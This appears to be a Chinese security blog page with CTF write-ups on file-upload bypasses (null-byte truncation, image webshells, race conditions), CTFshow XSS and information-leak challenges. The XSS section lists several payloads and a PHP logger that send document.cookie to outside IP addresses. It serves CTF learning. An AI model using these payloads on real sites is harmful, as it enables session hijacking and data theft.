<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311155615579.png" alt="image-20220311155615579"></p>
<h2 id="0x10-绕过白名单验证（00截断绕过）"><a href="#0x10-绕过白名单验证（00截断绕过）" class="headerlink" title="0x10 绕过白名单验证（00截断绕过）"></a>0x10 绕过白名单验证（00截断绕过）</h2><h3 id="1、00截断原理"><a href="#1、00截断原理" class="headerlink" title="1、00截断原理"></a>1、00截断原理</h3><p>0x00是十六进制表示方法，是asci码为0的字符，在有些函数处理时，会把这个字符当做结束符。<br>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p>
<p>在PHP5.3之后的版本中完全修复了00截断。并且00截断受限与GPC，addslashes函数。</p>
<h3 id="2、GET型00截断"><a href="#2、GET型00截断" class="headerlink" title="2、GET型00截断"></a>2、GET型00截断</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311160551694.png" alt="image-20220311160551694"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311160627812.png" alt="image-20220311160627812"></p>
<h3 id="3、POST型00截断"><a href="#3、POST型00截断" class="headerlink" title="3、POST型00截断"></a>3、POST型00截断</h3><p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改为00.</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311161249365.png" alt="image-20220311161249365"></p>
<p>2.php+空格，点击hex<img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311161324643.png" alt="image-20220311161324643"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311161411889.png" alt="image-20220311161411889"></p>
<p>把空格代表的20，改为00</p>
<p>访问2.php</p>
<h3 id="4、一句话代码执行webshell"><a href="#4、一句话代码执行webshell" class="headerlink" title="4、一句话代码执行webshell"></a>4、一句话代码执行webshell</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311161744854.png" alt="image-20220311161744854"></p>
<h2 id="0x11-图片webshell上传"><a href="#0x11-图片webshell上传" class="headerlink" title="0x11 图片webshell上传"></a>0x11 图片webshell上传</h2><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318154606791.png" alt="image-20220318154606791"></p>
<h3 id="1、图片webshell制作"><a href="#1、图片webshell制作" class="headerlink" title="1、图片webshell制作"></a>1、图片webshell制作</h3><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。<br>针对这种情况可以直接新建要给1.jpg,其中代码内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF98A</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2、上传图片webshell文件"><a href="#2、上传图片webshell文件" class="headerlink" title="2、上传图片webshell文件"></a>2、上传图片webshell文件</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311162658179.png" alt="image-20220311162658179"></p>
<h3 id="3、文件包含漏洞代码分析"><a href="#3、文件包含漏洞代码分析" class="headerlink" title="3、文件包含漏洞代码分析"></a>3、文件包含漏洞代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311162816240.png" alt="image-20220311162816240"></p>
<h3 id="4、结合文件包含输出PHPinfo"><a href="#4、结合文件包含输出PHPinfo" class="headerlink" title="4、结合文件包含输出PHPinfo"></a>4、结合文件包含输出PHPinfo</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311163034064.png" alt="image-20220311163034064"></p>
<h2 id="0x12-竞争条件"><a href="#0x12-竞争条件" class="headerlink" title="0x12 竞争条件"></a>0x12 竞争条件</h2><h3 id="1、文件上传过程介绍"><a href="#1、文件上传过程介绍" class="headerlink" title="1、文件上传过程介绍"></a>1、文件上传过程介绍</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311163708860.png" alt="image-20220311163708860"></p>
<h3 id="2、竞争条件原理介绍"><a href="#2、竞争条件原理介绍" class="headerlink" title="2、竞争条件原理介绍"></a>2、竞争条件原理介绍</h3><p>网站逻辑:<br>1、网站允许上传任意文件，然后检查上传文件是否包含Webshell，如果包含删除该文件。<br>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。<br>在删除之前访问上传的php文件,从而执行上传文件中的php代码。</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311163930292.png" alt="image-20220311163930292"></p>
<h3 id="3、竞争条件代码分析"><a href="#3、竞争条件代码分析" class="headerlink" title="3、竞争条件代码分析"></a>3、竞争条件代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311164245488.png" alt="image-20220311164245488"></p>
<h3 id="4、竞争条件文件上传利用"><a href="#4、竞争条件文件上传利用" class="headerlink" title="4、竞争条件文件上传利用"></a>4、竞争条件文件上传利用</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311164439751.png" alt="image-20220311164439751"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311164729029.png" alt="image-20220311164729029"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311164522656.png" alt="image-20220311164522656"></p>
<p>先运行python脚本，再上传</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318154439800.png" alt="image-20220318154439800"></p>
<p>绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318154830610.png" alt="image-20220318154830610"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318154913378.png" alt="image-20220318154913378"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318155352530.png" alt="image-20220318155352530"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220318155428072.png" alt="image-20220318155428072"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/CTFshow-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/10/CTFshow-3/" class="post-title-link" itemprop="url">CTFshow-3</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-10 14:42:06" itemprop="dateCreated datePublished" datetime="2022-03-10T14:42:06+08:00">2022-03-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-28 20:17:09" itemprop="dateModified" datetime="2022-03-28T20:17:09+08:00">2022-03-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><img src="/2022/03/10/CTFshow-3/image-20220318223033282.png" alt="image-20220318223033282"></p>
<p>先测试一下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>`，</span><br></pre></td></tr></table></figure>

<p>弹窗成功，第一题应该是没有任何的过滤，所以直接打cookie即可。</p>
<p>收集一下可用的姿势吧，首先是img：</p>
<pre><code>&lt;script&gt;
var img=document.createElement(&quot;img&quot;); img.src=&quot;http://118.31.168.198:39543/&quot;+document.cookie;
&lt;/script&gt;
</code></pre>
<p>直接创建img标签的话，比如这样</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;http://xxx.xxx.xxx.xxx:39543/&quot;</span>+document.cookie /&gt;</span><br></pre></td></tr></table></figure>

<p>不行，这里识别不到document.cookie，套一层</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也不行，看来想在script里面创建img的话只能这样了，还是不会js，太菜了。</p>
<p>不过利用外带的话还有其他的姿势，比如window.open:</p>
<pre><code>&lt;script&gt;window.open(&#39;http://118.31.168.198:39543/&#39;+document.cookie)&lt;/script&gt;
</code></pre>
<p>此外也还可以这样</p>
<pre><code>&lt;script&gt;window.location.href=&#39;http://118.31.168.198:39543/&#39;+document.cookie&lt;/script&gt;
</code></pre>
<p>不加window也可以：</p>
<pre><code>&lt;script&gt;location.href=&#39;http://118.31.168.198:39543/&#39;+document.cookie&lt;/script&gt;
</code></pre>
<p>此外，input也可以，不过需要加上autofocus。：</p>
<pre><code>&lt;input onfocus=&quot;window.open(&#39;http://118.31.168.198:39543/&#39;+document.cookie)&quot; autofocus&gt;

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
</code></pre>
<p>还有svg标签。</p>
<pre><code>&lt;svg onload=&quot;window.open(&#39;http://118.31.168.198:39543/&#39;+document.cookie)&quot;&gt;
</code></pre>
<p>还有iframe标签：</p>
<pre><code>&lt;iframe onload=&quot;window.open(&#39;http://118.31.168.198:39543/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p>还有body标签：</p>
<pre><code>&lt;body onload=&quot;window.open(&#39;http://118.31.168.198:39543/&#39;+document.cookie)&quot;&gt;
</code></pre>
<p>正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：</p>
<pre><code>python3 -m http.server 39543
</code></pre>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location.href=<span class="string">&#x27;http://121.4.112.210/xss/test.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">test.php:</span></span><br><span class="line"><span class="xml"></span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span></span><br><span class="line"><span class="php"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="php">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span></span><br><span class="line"><span class="php">fclose(<span class="variable">$log</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/10/CTFshow-3/image-20220318223857459.png" alt="image-20220318223857459"></p>
<p>过滤了空格其实正规的绕法应该是拿<code>/</code>来绕：</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/08/CTFshow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/08/CTFshow/" class="post-title-link" itemprop="url">CTFshow</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-08 17:02:01" itemprop="dateCreated datePublished" datetime="2022-03-08T17:02:01+08:00">2022-03-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-02 23:04:05" itemprop="dateModified" datetime="2022-04-02T23:04:05+08:00">2022-04-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>12 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>flag在源代码里</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>方法一：bp抓包，POST源码</p>
<p><img src="/2022/03/08/CTFshow/image-20220115164912202.png" alt="image-20220115164912202"></p>
<p>方法二：URL前加view-source：</p>
<p><img src="/2022/03/08/CTFshow/image-20220115165115804.png" alt="image-20220115165115804"></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>bp抓包，查看响应包</p>
<p><img src="/2022/03/08/CTFshow/image-20220115170052755.png" alt="image-20220115170052755"></p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="/2022/03/08/CTFshow/image-20220115204306731.png" alt="image-20220115204306731"></p>
<p>访问robots.txt</p>
<p><img src="/2022/03/08/CTFshow/image-20220115204339638.png" alt="image-20220115204339638"></p>
<p>flag在flagishere.txt里</p>
<p>robots.txt是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p>
<p>当搜索引擎蜘蛛访问网站时，它会首先检查该站点根目录下是否存在robots.txt文件，如果该文件存在，搜索引擎蜘蛛就会按照该文件中的内容来确定爬行的范围；如果该文件不存在，则所有的搜索引擎蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<p>通常搜索引擎对网站派出的蜘蛛是有配额的，多大规模的网站放出多少蜘蛛。如果我们不配置robots文件，那么蜘蛛来到网站以后会无目的的爬行，造成的一个结果就是，需要它爬行的目录，没有爬行到，不需要爬行的，也就是我们不想被收录的内容却被爬行并放出快照。所以robots文件对于我们做网站优化来说具有很重要的影响。</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="/2022/03/08/CTFshow/image-20220115204605393.png" alt="image-20220115204605393"></p>
<p>phps文件泄露 phps源码访问：index.phps</p>
<p><img src="/2022/03/08/CTFshow/image-20220115204702358.png" alt="image-20220115204702358"></p>
<p>index.phps 其用于查看php的源代码<img src="/2022/03/08/CTFshow/image-20220115205037263.png" alt="image-20220115205037263" style="zoom:67%;"></p>
<p>phps即为 PHP Source，phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p><img src="/2022/03/08/CTFshow/image-20220115210116656.png" alt="image-20220115210116656"></p>
<p>bp抓包源码出不来，网站源码泄露，访问<a target="_blank" rel="noopener" href="http://www.zip获取网站源码/">www.zip获取网站源码</a></p>
<p><a href="http://www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。">www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。</a></p>
<p>解压后：<img src="/2022/03/08/CTFshow/image-20220115210543987.png" alt="image-20220115210543987"></p>
<p>为假的flag</p>
<p><img src="/2022/03/08/CTFshow/image-20220115210710041.png" alt="image-20220115210710041"></p>
<p>在网页打开文件，直接访问</p>
<p><img src="/2022/03/08/CTFshow/image-20220115210734790.png" alt="image-20220115210734790"></p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="/2022/03/08/CTFshow/image-20220115221144978.png" alt="image-20220115221144978"></p>
<p>.开头的文件在Linux为隐藏文件夹，这为版本控制系统，多人协作，git可以版本控制，每个人的代码放到仓库中</p>
<p> .git文件夹是git init后在当前目录生成的一个管理git仓库的文件夹，这里包含所有git操作所需要的东西</p>
<p><img src="/2022/03/08/CTFshow/image-20220115221125272.png" alt="image-20220115221125272"></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="/2022/03/08/CTFshow/image-20220115221452471.png" alt="image-20220115221452471"></p>
<p>同样为这个</p>
<p>.git 没反应</p>
<p>.svn</p>
<p><img src="/2022/03/08/CTFshow/image-20220115221625932.png" alt="image-20220115221625932"></p>
<p>svn泄露</p>
<p>svn仍为版本控制系统</p>
<p>协作开发需要版本控制系统，git和SVN，应该是目前使用最多的两个版本控制系统。在Linux环境下git，是命令行的方式，现在在Windows下，与tortoiseSVN一样，有tortoisegit，不过需要先安装git（msysgit）。</p>
<p>git与SVN的区别0</p>
<p>1.git是分布式的，SVN是集中式的</p>
<p>开发人员可以建立自己的分支，并在自己的分支上进行操作，减少了冲突</p>
<p>2.git可以在没有网络的情况下使用</p>
<p>从远程库clone一个到本地库，没有网络的情况下，可以将修改提交到本地库，等有网的时候再传上去。</p>
<p>3.git和SVN的版本控制</p>
<p>是通过.git和.svn文件，.git只是在本地的版本库的目录下存在，而.svn存在于每一个文件夹，当我们不需要版本控制的时候，要删除.svn很费时。</p>
<p>4.版本号问题</p>
<p>svn有明确的版本号，git对于每一个版本，都通过SHA1算法生成一个唯一标示的码，方便追溯到之前的版本。</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="/2022/03/08/CTFshow/image-20220115222114188.png" alt="image-20220115222114188"></p>
<p>vim缓存文件泄露</p>
<p><img src="/2022/03/08/CTFshow/image-20220115222503948.png" alt="image-20220115222503948"></p>
<p><img src="/2022/03/08/CTFshow/image-20220115222551664.png" alt="image-20220115222551664"></p>
<p>在生产环境下，在vim非正常退出的情况下，会产生一个交换文件，.php.swp，里面有还没有完成的内容</p>
<p>使用vi/vim，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件 以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除 。下面说不测。<br> 不测分为：<br> 1 当你用多个程序编辑同一个文件时。<br> 2 非常规退出时。</p>
<p><img src="/2022/03/08/CTFshow/image-20220115224231678.png" alt="image-20220115224231678"></p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="/2022/03/08/CTFshow/image-20220115224616061.png" alt="image-20220115224616061"></p>
<p><img src="/2022/03/08/CTFshow/image-20220115224847800.png" alt="image-20220115224847800"></p>
<p><img src="/2022/03/08/CTFshow/image-20220115224902121.png" alt="image-20220115224902121"></p>
<p>URL解码：</p>
<p>./CTFshow{b07aa290-1d42-4d61-b993-6b3e27dbf1ea}</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/2022/03/08/CTFshow/image-20220116134407774.png" alt="image-20220116134407774"></p>
<p>在线域名解析</p>
<img src="/2022/03/08/CTFshow/image-20220116134911085.png" alt="image-20220116134911085" style="zoom:67%;">

<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p><img src="/2022/03/08/CTFshow/image-20220116135003467.png" alt="image-20220116135003467"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116135617684.png" alt="image-20220116135617684"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116135532861.png" alt="image-20220116135532861"></p>
<p>用户名：admin 密码：372619038</p>
<p><img src="/2022/03/08/CTFshow/image-20220116135844808.png" alt="image-20220116135844808"></p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p><img src="/2022/03/08/CTFshow/image-20220116141900525.png" alt="image-20220116141900525"></p>
<p>找到技术文档</p>
<p><img src="/2022/03/08/CTFshow/image-20220116142105448.png" alt="image-20220116142105448"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116142117466.png" alt="image-20220116142117466"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116142252074.png" alt="image-20220116142252074"></p>
<p>登录后<img src="/2022/03/08/CTFshow/image-20220116142348164.png" alt="image-20220116142348164"></p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="/2022/03/08/CTFshow/image-20220116142752905.png" alt="image-20220116142752905"></p>
<p>提示访问editor</p>
<img src="/2022/03/08/CTFshow/image-20220116143037122.png" alt="image-20220116143037122" style="zoom:67%;">

<p>图片空间里面找到一个文件<img src="/2022/03/08/CTFshow/image-20220116143629362.png" alt="image-20220116143629362"></p>
<img src="/2022/03/08/CTFshow/image-20220116143552228.png" alt="image-20220116143552228" style="zoom:67%;">

<img src="/2022/03/08/CTFshow/image-20220116143754042.png" alt="image-20220116143754042" style="zoom:67%;">

<p>不对</p>
<p>nothinghere文件夹里的fl000g.txt</p>
<p><img src="/2022/03/08/CTFshow/image-20220116144035834.png" alt="image-20220116144035834"></p>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p><img src="/2022/03/08/CTFshow/image-20220116144246693.png" alt="image-20220116144246693"></p>
<img src="/2022/03/08/CTFshow/image-20220116144409085.png" alt="image-20220116144409085" style="zoom:67%;">

<img src="/2022/03/08/CTFshow/image-20220116144448192.png" alt="image-20220116144448192" style="zoom:33%;">

<p>点击忘记密码：</p>
<p><img src="/2022/03/08/CTFshow/image-20220116144736889.png" alt="image-20220116144736889"></p>
<p>搜素刚刚的QQ，陕西西安</p>
<p><img src="/2022/03/08/CTFshow/image-20220116144839363.png" alt="image-20220116144839363"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116144920937.png" alt="image-20220116144920937"></p>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p><img src="/2022/03/08/CTFshow/image-20220116145025640.png" alt="image-20220116145025640"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116145520659.png" alt="image-20220116145520659"></p>
<p>默认探针名字：tz.php</p>
<img src="/2022/03/08/CTFshow/image-20220116150323740.png" alt="image-20220116150323740" style="zoom:67%;">

<p><img src="/2022/03/08/CTFshow/image-20220116150618762.png" alt="image-20220116150618762"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116150644760.png" alt="image-20220116150644760"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116150722008.png" alt="image-20220116150722008"></p>
<p>可以点，点进去</p>
<p>在环境哪儿：<img src="/2022/03/08/CTFshow/image-20220116150834750.png" alt="image-20220116150834750"></p>
<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><img src="/2022/03/08/CTFshow/image-20220116151831468.png" alt="image-20220116151831468"></p>
<p>备份的sql文件：backup.sql</p>
<p><img src="/2022/03/08/CTFshow/image-20220116153458454.png" alt="image-20220116153458454"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116153607572.png" alt="image-20220116153607572"></p>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><img src="/2022/03/08/CTFshow/image-20220116153831221.png" alt="image-20220116153831221"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116154606705.png" alt="image-20220116154606705"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116154622944.png" alt="image-20220116154622944"></p>
<p>若分数大于100，会弹出一个框</p>
<p>这是Unicode编码，解码后：<img src="/2022/03/08/CTFshow/image-20220116154949245.png" alt="image-20220116154949245"></p>
<p>110.php看看<img src="/2022/03/08/CTFshow/image-20220116155025878.png" alt="image-20220116155025878"></p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p><img src="/2022/03/08/CTFshow/image-20220116155402143.png" alt="image-20220116155402143"></p>
<p>查看网页源代码</p>
<p><img src="/2022/03/08/CTFshow/image-20220116155602966.png" alt="image-20220116155602966"></p>
<p>输入仍为错误，前端有加密</p>
<p>用bp抓包修改<img src="/2022/03/08/CTFshow/image-20220116155944387.png" alt="image-20220116155944387"></p>
<p>在此修改</p>
<p><img src="/2022/03/08/CTFshow/image-20220116160044874.png" alt="image-20220116160044874"></p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb文件是早期asp+<span class="keyword">access</span>构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p>db目录，数据库作为一个文件存储，访问/db/db.mdb，下载文件。mdb是一种文件格式，它是Access数据库的一种文件存储格式，由于对数据操作的方便性，常用在一些中小型程序中；对于mdb格式的文件可以用Access打开。</p>
<p><img src="/2022/03/08/CTFshow/image-20220116160830902.png"></p>
<p>用记事本打开，搜索flag<img src="/2022/03/08/CTFshow/image-20220116162609743.png" alt="image-20220116162609743"></p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>用bp抓包</p>
<p><img src="/2022/03/08/CTFshow/image-20220116202537401.png" alt="image-20220116202537401"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116203852617.png" alt="image-20220116203852617"></p>
<p>是输入的用户密码，不过中间带了冒号</p>
<img src="/2022/03/08/CTFshow/image-20220116171821919.png" alt="image-20220116171821919" style="zoom:67%;">

<p>payload2(密码)：导入提供的字典，base64加密</p>
<img src="/2022/03/08/CTFshow/image-20220116204048032.png" alt="image-20220116204048032" style="zoom:67%;">

<p>payload1和payload2都需要取消勾选</p>
<p><img src="/2022/03/08/CTFshow/image-20220116203131650.png" alt="image-20220116203131650"></p>
<p><img src="/2022/03/08/CTFshow/image-20220116204646221.png" alt="image-20220116204646221"></p>
<p>查看响应包<img src="/2022/03/08/CTFshow/image-20220116204721558.png" alt="image-20220116204721558" style="zoom:67%;"></p>
